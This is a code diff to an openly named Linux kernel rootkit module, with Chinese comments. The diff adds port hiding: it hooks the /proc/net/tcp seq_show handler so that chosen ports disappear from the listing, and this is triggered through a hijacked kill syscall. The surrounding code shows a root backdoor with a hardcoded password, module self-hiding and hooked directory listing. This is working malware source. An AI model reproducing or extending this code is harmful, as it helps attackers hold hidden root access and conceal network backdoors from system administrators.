@@ -12,11 +12,19 @@
 # include <linux/fs.h> // struct file_operations.
 # include <linux/proc_fs.h> // proc_create, proc_remove.
 # include <linux/cred.h> // struct cred.
+#include <net/tcp.h>
 MODULE_LICENSE("GPL");
 #include "RootKit.h"
 //后门
 #define ROOT_PATH "/"
 #define PROC_PATH "/proc"
+
+//端口
+#define NEEDLE_LEN 6
+#define TMPSZ 150
+#define MAX_PORT 100
+#define SEQ_AFINFO_STRUCT struct tcp_seq_afinfo
+#define NET_ENTRY "/proc/net/tcp"
 
 #define BACKDOOR_NAME "backdoor"
 #define BACKDOOR_AUTH "password"
@@ -32,9 +40,18 @@ typedef asmlinkage long (*orig_open_t)(const char*, int);
 orig_getdents_t orig_getdents;
 orig_getdents64_t orig_getdents64;
 orig_kill_t orig_kill;
+
+ // 需要隐藏的端口列表
+int port_list[MAX_PORT] = {53};
+// 隐藏端口列表长度
+int port_num = 1;
+// 端口隐藏
+int (* real_seq_show)(struct seq_file *seq, void *v);
+int fake_seq_show(struct seq_file *seq, void *v);
+
 //创建与删除一个/proc下面的项目
 struct proc_dir_entry *entry;
-static inline struct proc_dir_entry *proc_create(const char *name, umode_t mode, struct proc_dir_entry *parent, const struct file_operations *proc_fops);
+//static inline struct proc_dir_entry *proc_create(const char *name, umode_t mode, struct proc_dir_entry *parent, const struct file_operations *proc_fops);
  
 void
 proc_remove(struct proc_dir_entry *entry);
@@ -389,6 +406,26 @@ out:
 	return ret;
 }
 
+// 端口隐藏
+int fake_seq_show(struct seq_file* seq, void *v) {
+	int i;
+	char needle[NEEDLE_LEN];
+	int ret;
+	ret = real_seq_show(seq, v);
+
+			
+	for(i = 0; i < port_num; i++) {
+		snprintf(needle, NEEDLE_LEN, ":%04X", port_list[i]);
+		if (strnstr(seq->buf + seq->count - TMPSZ, needle, TMPSZ)) {
+			fm_alert("Hiding port %d using needle %s.\n",
+							port_list[i], needle);
+			seq->count -= TMPSZ;
+			break;
+		}
+	}
+	return ret;
+}
+
 // root后门
 ssize_t write_handler(struct file *filp, const char __user *buff, 
 				size_t count, loff_t *offp) {
@@ -483,6 +520,10 @@ hacked_kill(pid_t pid, int sig)
 			if (module_hidden) module_show();
 			else module_hide();
 			break;
+		case HIDEPORT:
+			set_afinfo_seq_op(show, NET_ENTRY, SEQ_AFINFO_STRUCT, 
+					fake_seq_show, real_seq_show);
+			break;
 		default:
 			return orig_kill(pid, sig);
 	}
@@ -534,6 +575,11 @@ RootKit_cleanup(void)
 	proc_remove(entry);
         fm_alert("%s\n", "EXIT");
 	protect_memory();
+	void *dummy;
+    if (real_seq_show) {
+	 	set_afinfo_seq_op(show, NET_ENTRY, SEQ_AFINFO_STRUCT, 
+						real_seq_show, dummy);
+	}
 }
 
 module_init(RootKit_init);
